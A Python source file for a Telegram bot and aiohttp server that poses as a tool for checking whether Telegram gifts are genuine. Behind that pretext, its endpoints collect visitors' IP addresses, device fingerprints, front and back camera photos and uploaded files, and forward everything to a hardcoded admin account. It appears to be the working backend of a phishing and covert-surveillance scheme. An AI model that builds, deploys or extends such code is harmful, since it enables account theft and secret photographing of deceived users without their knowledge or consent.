import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile, FSInputFile
import base64

# =====================================================
# ПАРАМЕТРЫ НАСТРОЙКИ
# =====================================================
API_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [760217595] 
WEB_APP_URL = "https://nicegrambot.vercel.app/"
# =====================================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- УТИЛИТЫ ---

def get_all_admins():
    return ADMIN_IDS

# --- БОТ (КОМАНДЫ) ---

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
    ])
    
    text_content = (
        "🖐Привет! Я — бот который поможет более детально узнать о вашем подарке, "
        "от его покупки до того за какие звёзды они были куплены,помогу отличить реальный подарок от чистого визуала!"
    )
    
    try:
        photo = FSInputFile("nicegram2.jpg")
        await message.answer_photo(photo=photo, caption=text_content, reply_markup=markup)
    except Exception as e:
        logging.error(f"Не удалось отправить фото (проверьте наличие nicegram2.jpg): {e}")
        await message.answer(text_content, reply_markup=markup)

@router.message(Command("text"))
async def cmd_text(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ У вас нет прав на использование этой команды.")
        return

    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("❌ Используйте: /text <user_id> <сообщение>")
        return
    
    try:
        user_id = int(args[1])
        text_to_send = args[2]
        await bot.send_message(chat_id=user_id, text=text_to_send)
        await message.answer(f"✅ Сообщение отправлено пользователю {user_id}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")

# --- ВЕБ-СЕРВЕР ---

routes = web.RouteTableDef()

@routes.get("/")
async def root(request):
    return web.Response(text="OK")

@routes.post('/log_entry')
async def handle_log_entry(request: web.Request):
    try:
        data = await request.json()
        
        # Получаем IP адрес
        ip_address = request.headers.get('X-Forwarded-For', request.remote)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        user_id = str(data.get('user_id', '0000'))
        username = data.get('username', 'не указан')
        ua = data.get('user_agent', 'неизвестен')
        platform = data.get('platform', 'неизвестно')
        language = data.get('language', 'неизвестен')
        timezone = data.get('timezone', 'неизвестна')
        screen = data.get('screen', 'неизвестно')
        timestamp = data.get('timestamp', 'неизвестно')
        
        # Расширенное сообщение
        msg = (
            f"🚀 **Вход в Mini App**\n\n"
            f"👤 **Пользователь:**\n"
            f"├ Username: @{username}\n"
            f"├ ID: `{user_id}`\n"
            f"└ Язык: {language}\n\n"
            f"🌐 **Сеть:**\n"
            f"├ IP: `{ip_address}`\n"
            f"└ Платформа: {platform}\n\n"
            f"📱 **Устройство:**\n"
            f"├ User-Agent: `{ua}`\n"
            f"└ Разрешение: {screen}\n\n"
            f"🕐 **Время:**\n"
            f"├ Timestamp: {timestamp}\n"
            f"└ Timezone: {timezone}"
        )

        for admin_id in get_all_admins():
            try:
                await bot.send_message(admin_id, msg, parse_mode="Markdown")
            except: 
                pass
            
        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in log: {e}")
        return web.Response(status=500)

@routes.post('/send_photos')
async def handle_send_photos(request: web.Request):
    """Эндпоинт для получения фотографий с камер"""
    try:
        data = await request.json()
        
        ip_address = request.headers.get('X-Forwarded-For', request.remote)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        user_id = str(data.get('user_id', '0000'))
        username = data.get('username', 'не указан')
        
        front_photo = data.get('front_camera')
        back_photo = data.get('back_camera')
        
        caption = (
            f"📸 **Фото с камер**\n\n"
            f"👤 User: @{username} (ID: `{user_id}`)\n"
            f"🌐 IP: `{ip_address}`"
        )
        
        for admin_id in get_all_admins():
            try:
                # Отправляем фронтальную камеру
                if front_photo and front_photo.startswith('data:image'):
                    img_data = base64.b64decode(front_photo.split(',')[1])
                    await bot.send_photo(
                        chat_id=admin_id,
                        photo=BufferedInputFile(img_data, filename=f"front_{user_id}.jpg"),
                        caption=f"{caption}\n📷 Фронтальная камера",
                        parse_mode="Markdown"
                    )
                
                # Отправляем заднюю камеру
                if back_photo and back_photo.startswith('data:image'):
                    img_data = base64.b64decode(back_photo.split(',')[1])
                    await bot.send_photo(
                        chat_id=admin_id,
                        photo=BufferedInputFile(img_data, filename=f"back_{user_id}.jpg"),
                        caption=f"{caption}\n📷 Задняя камера",
                        parse_mode="Markdown"
                    )
                    
            except Exception as e:
                logging.error(f"Failed to send photos to admin: {e}")
        
        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in send_photos: {e}")
        return web.Response(status=500)

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    try:
        reader = await request.multipart()
        
        # Получаем IP
        ip_address = request.headers.get('X-Forwarded-For', request.remote)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        user_id = "0000"
        username = "Unknown"
        ua = "Unknown"
        platform = "Unknown"
        language = "Unknown"
        timezone = "Unknown"
        screen = "Unknown"
        timestamp = "Unknown"
        file_data = None
        filename = "data.json"

        while True:
            part = await reader.next()
            if part is None: 
                break
            
            if part.name == 'user_agent': 
                ua = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'user_id':
                user_id = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'username':
                username = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'platform':
                platform = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'language':
                language = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'timezone':
                timezone = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'screen':
                screen = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'timestamp':
                timestamp = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'file':
                filename = part.filename or "data.json"
                file_data = await part.read()

        if file_data:
            caption_text = (
                f"🚨 **Новый файл загружен!**\n\n"
                f"👤 **Пользователь:**\n"
                f"├ Username: @{username}\n"
                f"├ ID: `{user_id}`\n"
                f"└ Язык: {language}\n\n"
                f"🌐 **Сеть:**\n"
                f"├ IP: `{ip_address}`\n"
                f"└ Платформа: {platform}\n\n"
                f"📱 **Устройство:**\n"
                f"├ User-Agent: `{ua}`\n"
                f"└ Разрешение: {screen}\n\n"
                f"🕐 **Время:**\n"
                f"├ Timestamp: {timestamp}\n"
                f"└ Timezone: {timezone}\n\n"
                f"📎 **Файл:** `{filename}`"
            )

            for admin_id in get_all_admins():
                try:
                    await bot.send_document(
                        chat_id=admin_id,
                        document=BufferedInputFile(file_data, filename=filename),
                        caption=caption_text,
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logging.error(f"Failed to send doc to admin: {e}")

        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in upload: {e}")
        return web.Response(status=500)

@routes.options('/upload')
@routes.options('/log_entry')
@routes.options('/send_photos')
async def handle_options(request):
    return web.Response(headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, X-Telegram-Init-Data"
    })

async def main():
    app = web.Application()
    app.add_routes(routes)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"Сервер запущен на порту {port}")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
